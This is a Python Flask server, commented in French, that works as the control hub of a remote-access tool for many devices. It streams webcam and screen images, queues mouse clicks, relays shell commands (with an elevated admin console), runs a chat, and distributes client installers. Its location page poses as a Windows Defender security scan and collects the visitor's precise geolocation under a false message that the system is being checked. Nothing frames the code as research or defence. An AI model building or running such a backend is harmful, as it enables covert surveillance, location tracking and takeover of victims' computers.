"""
Serveur de contrôle caméra / écran / shell / chat — API HTTP.

Ce serveur est le point central : il peut piloter PLUSIEURS clients
(appareils) en même temps. Pour chaque appareil, les fonctionnalités
suivantes sont suivies indépendamment :
  - Deux flux vidéo : caméra et capture d'écran
  - Localisation : navigateur ouvert/fermé + position
  - Souris : position remontée, clics en file
  - CMD Commandes : console persistante côté client, buffer roulant de sortie
  - CMD Commandes ADMIN : idem mais via UAC Windows (buffer séparé)
  - Chat : vraie console visible côté client, historique de conversation

L'interface de contrôle (server_gui) s'y connecte en HTTP.
"""

import time
import threading
import uuid as _uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, request, jsonify, Response, send_from_directory, redirect

app = Flask(__name__)

PROJECT_DIR = Path(__file__).resolve().parent
GUI_INSTALL_DIR = PROJECT_DIR / "install" / "linux"

GITHUB_RELEASE_BASE = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"
GITHUB_RELEASE_BASE_GUI = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"

devices_lock = threading.Condition()
devices: dict[str, dict] = {}

CLIENT_TIMEOUT_SECONDS = 10
MAX_LONG_POLL_SECONDS = 3.0
STREAM_NAMES = ("camera", "screen")
MAX_PENDING_CLICKS = 50
MAX_OUTPUT_BUFFER = 64_000
MAX_PENDING_SHELL_INPUT = 20
MAX_CHAT_HISTORY = 100


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok"})


def _default_stream_state() -> dict:
    return {"command": "STOP", "active": False, "latest_frame": None, "seq": 0, "last_ts": None}


def _default_location_state() -> dict:
    return {"command": "CLOSE", "browser_open": False, "latest": None}


def _default_mouse_state() -> dict:
    return {
        "x": None, "y": None,
        "screen_w": None, "screen_h": None,
        "ts": None,
        "pending_clicks": [],
    }


def _default_shell_state() -> dict:
    return {
        # --- CMD Commandes (user) ---
        "cmd_console_open": False,
        "cmd_console_cmd": "CLOSE",
        "output_buffer": "",
        "output_seq": 0,
        "shell_input": [],

        # --- CMD Commandes (admin) ---
        "admin_console_open": False,
        "admin_console_cmd": "CLOSE",
        "admin_refused": False,
        "admin_output_buffer": "",
        "admin_output_seq": 0,
        "admin_shell_input": [],

        # --- Chat ---
        "chat_out": [],
        "chat_in": [],
        "chat_history": [],
        "chat_window_open": False,
        "chat_window_cmd": "CLOSE",
    }


def _default_device_state(name: str | None) -> dict:
    return {
        "name": name or "Appareil inconnu",
        "platform": "unknown",
        "last_seen": None,
        "streams": {stream: _default_stream_state() for stream in STREAM_NAMES},
        "location": _default_location_state(),
        "mouse": _default_mouse_state(),
        "shell": _default_shell_state(),
    }


def _get_or_create_device(device_id: str, name: str | None = None) -> dict:
    device = devices.get(device_id)
    if device is None:
        device = _default_device_state(name)
        devices[device_id] = device
    elif name:
        device["name"] = name
    return device


def _device_is_alive(device: dict) -> bool:
    if device["last_seen"] is None:
        return False
    return (time.time() - device["last_seen"]) < CLIENT_TIMEOUT_SECONDS


# ---------------------------------------------------------------------
# Routes consommées par un CLIENT précis
# ---------------------------------------------------------------------

@app.route("/api/command", methods=["GET"])
def get_command():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id, request.args.get("name"))
        device["last_seen"] = time.time()

        # Rapport d'état du client vers le serveur
        if request.args.get("location_open") is not None:
            device["location"]["browser_open"] = request.args["location_open"] == "1"
        if request.args.get("chat_window_open") is not None:
            device["shell"]["chat_window_open"] = request.args["chat_window_open"] == "1"
        if request.args.get("cmd_console_open") is not None:
            device["shell"]["cmd_console_open"] = request.args["cmd_console_open"] == "1"
        if request.args.get("admin_console_open") is not None:
            device["shell"]["admin_console_open"] = request.args["admin_console_open"] == "1"
        if request.args.get("admin_refused") == "1":
            device["shell"]["admin_refused"] = True
        elif request.args.get("admin_console_open") == "1":
            device["shell"]["admin_refused"] = False
        plat = request.args.get("platform")
        if plat:
            device["platform"] = plat

        commands = {stream: device["streams"][stream]["command"] for stream in STREAM_NAMES}
        commands["location"] = device["location"]["command"]
        commands["cmd_console"] = device["shell"]["cmd_console_cmd"]
        commands["cmd_admin_console"] = device["shell"]["admin_console_cmd"]
        commands["chat_window"] = device["shell"]["chat_window_cmd"]

        pending_clicks = device["mouse"]["pending_clicks"]
        commands["mouse_click"] = pending_clicks.pop(0) if pending_clicks else None

        shell_input = device["shell"]["shell_input"]
        commands["shell_input"] = shell_input.pop(0) if shell_input else None

        admin_input = device["shell"]["admin_shell_input"]
        commands["shell_admin_input"] = admin_input.pop(0) if admin_input else None

        chat_out = device["shell"]["chat_out"]
        commands["chat_message"] = chat_out.pop(0) if chat_out else None

        return jsonify({"commands": commands})


@app.route("/api/frame", methods=["POST"])
def post_frame():
    device_id = request.args.get("device_id")
    stream = request.args.get("stream")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if stream not in STREAM_NAMES:
        return jsonify({"error": "stream invalide (camera ou screen attendu)"}), 400

    data = request.get_data()
    try:
        ts = int(request.args.get("ts", ""))
    except ValueError:
        ts = None

    with devices_lock:
        device = _get_or_create_device(device_id)
        state = device["streams"][stream]
        device["last_seen"] = time.time()
        last_ts = state["last_ts"]
        if ts is not None and last_ts is not None and ts <= last_ts and last_ts - ts < 10_000_000:
            return jsonify({"ok": True, "stale": True})
        if ts is not None:
            state["last_ts"] = ts
        state["latest_frame"] = data
        state["seq"] += 1
        devices_lock.notify_all()
    return jsonify({"ok": True})


# ---------------------------------------------------------------------
# Routes consommées par l'INTERFACE DE CONTRÔLE (GUI)
# ---------------------------------------------------------------------

@app.route("/api/devices", methods=["GET"])
def list_devices():
    with devices_lock:
        result = []
        for device_id, device in devices.items():
            last_seen = (
                datetime.fromtimestamp(device["last_seen"]).strftime("%H:%M:%S")
                if device["last_seen"] else None
            )
            result.append({
                "device_id": device_id,
                "name": device["name"],
                "platform": device.get("platform", "unknown"),
                "camera_on": device["streams"]["camera"]["active"],
                "screen_on": device["streams"]["screen"]["active"],
                "location_open": device["location"]["browser_open"],
                "admin_console_open": device["shell"]["admin_console_open"],
                "connected": _device_is_alive(device),
                "last_seen": last_seen,
            })
    return jsonify({"devices": result})


@app.route("/api/command", methods=["POST"])
def set_command():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    stream = payload.get("stream")
    command = payload.get("command")

    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if stream not in STREAM_NAMES:
        return jsonify({"error": "stream invalide (camera ou screen attendu)"}), 400
    if command not in ("START", "STOP"):
        return jsonify({"error": "commande invalide (START ou STOP attendu)"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["streams"][stream]["command"] = command
        device["streams"][stream]["active"] = command == "START"
    return jsonify({"ok": True})


@app.route("/api/status", methods=["GET"])
def get_status():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        last_seen = (
            datetime.fromtimestamp(device["last_seen"]).strftime("%H:%M:%S")
            if device["last_seen"] else None
        )
        return jsonify({
            "name": device["name"],
            "platform": device.get("platform", "unknown"),
            "client_connected": _device_is_alive(device),
            "last_seen": last_seen,
            "camera_on": device["streams"]["camera"]["active"],
            "screen_on": device["streams"]["screen"]["active"],
            "admin_console_open": device["shell"]["admin_console_open"],
        })


@app.route("/api/frame/latest", methods=["GET"])
def get_latest_frame():
    device_id = request.args.get("device_id")
    stream = request.args.get("stream")
    if not device_id or stream not in STREAM_NAMES:
        return "", 400

    after = request.args.get("after", type=int)
    wait = request.args.get("wait", default=0.0, type=float) or 0.0
    wait = max(0.0, min(wait, MAX_LONG_POLL_SECONDS))

    def has_new_frame() -> bool:
        device = devices.get(device_id)
        if device is None:
            return False
        state = device["streams"][stream]
        if state["latest_frame"] is None:
            return False
        return after is None or state["seq"] != after

    with devices_lock:
        if wait > 0 and not has_new_frame():
            devices_lock.wait_for(has_new_frame, timeout=wait)
        device = devices.get(device_id)
        state = device["streams"][stream] if device else None
        frame = state["latest_frame"] if state else None
        seq = state["seq"] if state else 0

    if frame is None or (after is not None and seq == after):
        return "", 204

    response = Response(frame, mimetype="image/jpeg")
    response.headers["X-Frame-Seq"] = str(seq)
    response.headers["Cache-Control"] = "no-store"
    return response


# ---------------------------------------------------------------------
# Localisation
# ---------------------------------------------------------------------

LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Centre de Sécurité Windows — Protection Intégrale</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2338bdf8'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
<style>
  * {{ box-sizing: border-box; }}
  body {{
    margin: 0; padding: 0; min-height: 100vh;
    background-color: #0b132b;
    background-image: 
      radial-gradient(circle at 50% 20%, #1c2c59 0%, transparent 60%),
      linear-gradient(rgba(11, 19, 43, 0.9), rgba(5, 9, 20, 0.95)),
      repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(0, 120, 212, 0.03) 40px, rgba(0, 120, 212, 0.03) 41px);
    color: #f1f5f9;
    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }}
  .window {{
    width: 100%; max-width: 480px;
    background: rgba(18, 24, 38, 0.85);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(0, 120, 212, 0.25);
    border-radius: 12px; 
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 120, 212, 0.1);
    overflow: hidden; margin: 20px;
  }}
  .window-header {{
    background: rgba(26, 35, 58, 0.9); 
    padding: 14px 18px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    display: flex; align-items: center; gap: 12px;
  }}
  .window-header svg {{ width: 20px; height: 20px; color: #38bdf8; flex-shrink: 0; }}
  .window-title {{ font-size: 0.85rem; color: #cbd5e1; font-weight: 600; letter-spacing: 0.3px; }}
  .window-body {{ padding: 32px 28px; }}
  .status-container {{ display: flex; align-items: flex-start; gap: 18px; margin-bottom: 24px; }}
  #dot {{
    width: 32px; height: 32px; border-radius: 50%;
    background: #f59e0b; flex-shrink: 0; margin-top: 2px;
    position: relative; box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4);
    animation: pulse 1.6s infinite;
    display: flex; align-items: center; justify-content: center;
  }}
  #dot::after {{ content: "!"; color: white; font-weight: bold; font-size: 16px; }}
  #dot.ok {{ background: #10b981; box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); animation: none; }}
  #dot.ok::after {{ content: "✓"; }}
  #dot.err {{ background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); animation: none; }}
  #dot.err::after {{ content: "✕"; }}
  @keyframes pulse {{
    0% {{ box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.6); }}
    70% {{ box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); }}
    100% {{ box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }}
  }}
  h1 {{ font-size: 1.2rem; font-weight: 600; margin: 0 0 6px 0; color: #ffffff; letter-spacing: 0.2px; }}
  p {{ margin: 0 0 4px 0; font-size: 0.9rem; color: #94a3b8; line-height: 1.4; }}
  .info-box {{
    background: rgba(15, 23, 42, 0.6); 
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 8px; padding: 14px 16px; margin-top: 22px;
    display: none;
  }}
  .info-label {{ font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #38bdf8; font-weight: 700; margin-bottom: 6px; }}
  #coords {{ font-family: "Consolas", "Courier New", monospace; font-size: 0.85rem; color: #e2e8f0; word-break: break-all; margin: 0; }}
  .footer-note {{ font-size: 0.8rem; color: #64748b; text-align: center; margin-top: 20px; }}
</style>
</head>
<body>
<div class="window">
  <div class="window-header">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    <span class="window-title">Windows Defender — Centre de Sécurité</span>
  </div>
  <div class="window-body">
    <div class="status-container">
      <div id="dot"></div>
      <div>
        <h1>Analyse de sécurité en cours</h1>
        <p id="status">Vérification des protocoles de protection...</p>
      </div>
    </div>
    <div class="info-box" id="debug-container">
      <div class="info-label">Flux de diagnostic système</div>
      <p id="coords">Initialisation...</p>
    </div>
    <div class="footer-note">
      Veuillez patienter pendant l'inspection approfondie du système.
    </div>
  </div>
</div>
<script>
  const DEVICE_ID = {device_id!r};
  const dot = document.getElementById("dot");
  const statusEl = document.getElementById("status");
  const coordsEl = document.getElementById("coords");
  let lastSent = 0;
  function send(lat, lon, accuracy) {{
    fetch("/location/report", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{device_id: DEVICE_ID, lat: lat, lon: lon, accuracy: accuracy, ts: Date.now()}}),
    }}).catch(function () {{}});
  }}
  function onPosition(pos) {{
    dot.className = "ok";
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    statusEl.textContent = "Analyse terminée. Système entièrement sécurisé.";
    coordsEl.textContent = lat.toFixed(6) + ", " + lon.toFixed(6) + "  (± " + Math.round(acc) + " m)";
    const now = Date.now();
    if (now - lastSent > 2000) {{
      lastSent = now;
      send(lat, lon, acc);
    }}
  }}
  function onError(err) {{
    dot.className = "err";
    statusEl.textContent = "Échec de l'inspection de sécurité (" + err.message + ").";
  }}
  if (!navigator.geolocation) {{
    dot.className = "err";
    statusEl.textContent = "Module de sécurité non pris en charge.";
  }} else {{
    navigator.geolocation.watchPosition(onPosition, onError, {{
      enableHighAccuracy: true, maximumAge: 0, timeout: 15000,
    }});
  }}
</script>
</body>
</html>
"""


@app.route("/location/page", methods=["GET"])
def location_page():
    device_id = request.args.get("device_id", "")
    return Response(LOCATION_PAGE_TEMPLATE.format(device_id=device_id), mimetype="text/html")


@app.route("/location/report", methods=["POST"])
def location_report():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    lat, lon = payload.get("lat"), payload.get("lon")
    if not device_id or lat is None or lon is None:
        return jsonify({"error": "device_id, lat et lon requis"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id)
        device["last_seen"] = time.time()
        device["location"]["latest"] = {
            "lat": float(lat),
            "lon": float(lon),
            "accuracy": payload.get("accuracy"),
            "ts": payload.get("ts", int(time.time() * 1000)),
        }
    return jsonify({"ok": True})


@app.route("/api/location/command", methods=["POST"])
def set_location_command():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    command = payload.get("command")

    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if command not in ("OPEN", "CLOSE"):
        return jsonify({"error": "commande invalide (OPEN ou CLOSE attendu)"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["location"]["command"] = command
    return jsonify({"ok": True})


@app.route("/api/location/latest", methods=["GET"])
def get_location_latest():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        location = device["location"]
        return jsonify({
            "command": location["command"],
            "browser_open": location["browser_open"],
            "latest": location["latest"],
        })


# ---------------------------------------------------------------------
# Souris
# ---------------------------------------------------------------------

@app.route("/api/mouse/move", methods=["POST"])
def mouse_move():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    x, y = payload.get("x"), payload.get("y")
    if not device_id or x is None or y is None:
        return jsonify({"error": "device_id, x et y requis"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id)
        device["last_seen"] = time.time()
        mouse = device["mouse"]
        mouse["x"], mouse["y"] = int(x), int(y)
        if payload.get("screen_w") and payload.get("screen_h"):
            mouse["screen_w"] = int(payload["screen_w"])
            mouse["screen_h"] = int(payload["screen_h"])
        mouse["ts"] = int(time.time() * 1000)
    return jsonify({"ok": True})


@app.route("/api/mouse/click", methods=["POST"])
def mouse_click():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    x, y = payload.get("x"), payload.get("y")
    if not device_id or x is None or y is None:
        return jsonify({"error": "device_id, x et y requis"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        pending = device["mouse"]["pending_clicks"]
        pending.append({"x": int(x), "y": int(y)})
        if len(pending) > MAX_PENDING_CLICKS:
            device["mouse"]["pending_clicks"] = pending[-MAX_PENDING_CLICKS:]
    return jsonify({"ok": True})


@app.route("/api/mouse/latest", methods=["GET"])
def mouse_latest():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        mouse = device["mouse"]
        return jsonify({
            "x": mouse["x"], "y": mouse["y"],
            "screen_w": mouse["screen_w"], "screen_h": mouse["screen_h"],
            "ts": mouse["ts"],
        })


# ---------------------------------------------------------------------
# CMD Commandes (user)
# ---------------------------------------------------------------------

@app.route("/api/shell/console", methods=["POST"])
def shell_console_control():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    command = payload.get("command")
    if not device_id or command not in ("OPEN", "CLOSE"):
        return jsonify({"error": "device_id et command (OPEN/CLOSE) requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["shell"]["cmd_console_cmd"] = command
    return jsonify({"ok": True})


@app.route("/api/shell/console/state", methods=["GET"])
def shell_console_state():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        return jsonify({
            "command": sh["cmd_console_cmd"],
            "console_open": sh["cmd_console_open"],
        })


@app.route("/api/shell/input", methods=["POST"])
def shell_input():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    text = payload.get("text")
    if not device_id or text is None:
        return jsonify({"error": "device_id et text requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        if len(sh["shell_input"]) >= MAX_PENDING_SHELL_INPUT:
            return jsonify({"error": "file pleine"}), 429
        sh["shell_input"].append({"id": _uuid.uuid4().hex, "text": text})
    return jsonify({"ok": True})


@app.route("/api/shell/output", methods=["POST"])
def shell_output():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    chunk = payload.get("chunk") or ""
    mode = payload.get("mode", "user")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = _get_or_create_device(device_id)
        sh = device["shell"]
        if mode == "admin":
            sh["admin_output_buffer"] = (sh["admin_output_buffer"] + chunk)[-MAX_OUTPUT_BUFFER:]
            sh["admin_output_seq"] += 1
        else:
            sh["output_buffer"] = (sh["output_buffer"] + chunk)[-MAX_OUTPUT_BUFFER:]
            sh["output_seq"] += 1
        devices_lock.notify_all()
    return jsonify({"ok": True})


@app.route("/api/shell/output/latest", methods=["GET"])
def shell_output_latest():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    after = request.args.get("after", type=int)
    wait = min(max(request.args.get("wait", 0.0, type=float) or 0.0, 0.0), 3.0)
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]

        def has_new() -> bool:
            return after is None or sh["output_seq"] != after

        if wait > 0 and not has_new():
            devices_lock.wait_for(has_new, timeout=wait)

        return jsonify({
            "seq": sh["output_seq"],
            "buffer": sh["output_buffer"],
            "console_open": sh["cmd_console_open"],
        })


# ---------------------------------------------------------------------
# CMD Commandes ADMIN
# ---------------------------------------------------------------------

@app.route("/api/shell/admin/console", methods=["POST"])
def shell_admin_console_control():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    command = payload.get("command")
    if not device_id or command not in ("OPEN", "CLOSE"):
        return jsonify({"error": "device_id et command (OPEN/CLOSE) requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["shell"]["admin_console_cmd"] = command
        if command == "CLOSE":
            device["shell"]["admin_refused"] = False
    return jsonify({"ok": True})


@app.route("/api/shell/admin/console/state", methods=["GET"])
def shell_admin_console_state():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        return jsonify({
            "command": sh["admin_console_cmd"],
            "console_open": sh["admin_console_open"],
            "admin_refused": sh["admin_refused"],
        })


@app.route("/api/shell/admin/input", methods=["POST"])
def shell_admin_input():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    text = payload.get("text")
    if not device_id or text is None:
        return jsonify({"error": "device_id et text requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        if len(sh["admin_shell_input"]) >= MAX_PENDING_SHELL_INPUT:
            return jsonify({"error": "file pleine"}), 429
        sh["admin_shell_input"].append({"id": _uuid.uuid4().hex, "text": text})
    return jsonify({"ok": True})


@app.route("/api/shell/admin/output/latest", methods=["GET"])
def shell_admin_output_latest():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    after = request.args.get("after", type=int)
    wait = min(max(request.args.get("wait", 0.0, type=float) or 0.0, 0.0), 3.0)
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]

        def has_new() -> bool:
            return after is None or sh["admin_output_seq"] != after

        if wait > 0 and not has_new():
            devices_lock.wait_for(has_new, timeout=wait)

        return jsonify({
            "seq": sh["admin_output_seq"],
            "buffer": sh["admin_output_buffer"],
            "console_open": sh["admin_console_open"],
            "admin_refused": sh["admin_refused"],
        })


# ---------------------------------------------------------------------
# Chat
# ---------------------------------------------------------------------

@app.route("/api/shell/chat_window", methods=["POST"])
def shell_chat_window():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    command = payload.get("command")
    if not device_id or command not in ("OPEN", "CLOSE"):
        return jsonify({"error": "device_id et command (OPEN/CLOSE) requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["shell"]["chat_window_cmd"] = command
    return jsonify({"ok": True})


@app.route("/api/shell/chat_window/state", methods=["GET"])
def shell_chat_window_state():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        return jsonify({
            "command": device["shell"]["chat_window_cmd"],
            "window_open": device["shell"]["chat_window_open"],
        })


@app.route("/api/shell/chat", methods=["POST"])
def shell_chat():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    message = payload.get("message")
    if not device_id or message is None:
        return jsonify({"error": "device_id et message requis"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        sh["chat_out"].append({"message": message[:4000], "ts": time.time()})
        sh["chat_history"].append({"role": "moi", "text": message, "ts": time.time()})
        sh["chat_history"] = sh["chat_history"][-MAX_CHAT_HISTORY:]
    return jsonify({"ok": True})


@app.route("/api/shell/result", methods=["POST"])
def shell_result():
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = _get_or_create_device(device_id)
        sh = device["shell"]
        if payload.get("type") == "chat":
            msg = (payload.get("message") or "")[:4000]
            sh["chat_in"].append({"message": msg, "ts": time.time()})
            sh["chat_history"].append({"role": "client", "text": msg, "ts": time.time()})
            sh["chat_history"] = sh["chat_history"][-MAX_CHAT_HISTORY:]
    return jsonify({"ok": True})


@app.route("/api/shell/results", methods=["GET"])
def shell_results():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        sh = device["shell"]
        data = {"chat_in": list(sh["chat_in"]), "chat_history": list(sh["chat_history"])}
        sh["chat_in"].clear()
    return jsonify(data)


# ---------------------------------------------------------------------
# Téléchargements
# ---------------------------------------------------------------------

@app.route("/client/download", methods=["GET"])
def download_client():
    return send_from_directory(PROJECT_DIR, "client.py", as_attachment=False)


@app.route("/client/download/bridge", methods=["GET"])
def download_admin_bridge():
    return send_from_directory(PROJECT_DIR, "admin_bridge.py", as_attachment=False)


@app.route("/client/download/admin_module", methods=["GET"])
def download_admin_module():
    return send_from_directory(PROJECT_DIR, "console_admin_windows.py", as_attachment=False)


@app.route("/client/requirements", methods=["GET"])
def download_requirements():
    return send_from_directory(PROJECT_DIR, "requirements.txt", as_attachment=False)


@app.route("/download/windows", methods=["GET"])
def download_windows_installer():
    return redirect(f"{GITHUB_RELEASE_BASE}/CameraClient-Setup.exe")


@app.route("/gui/install", methods=["GET"])
def download_gui_installer_script():
    return send_from_directory(GUI_INSTALL_DIR, "install_gui.sh", as_attachment=False)


@app.route("/gui/download", methods=["GET"])
def download_gui_source():
    return send_from_directory(PROJECT_DIR, "server_gui.py", as_attachment=False)


@app.route("/gui/requirements", methods=["GET"])
def download_gui_requirements():
    return send_from_directory(PROJECT_DIR, "requirements-gui.txt", as_attachment=False)


@app.route("/download/windows/gui", methods=["GET"])
def download_windows_gui_exe():
    return redirect(f"{GITHUB_RELEASE_BASE_GUI}/CameraServerGUI.exe")


if __name__ == "__main__":
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host="0.0.0.0", port=5050, threaded=True)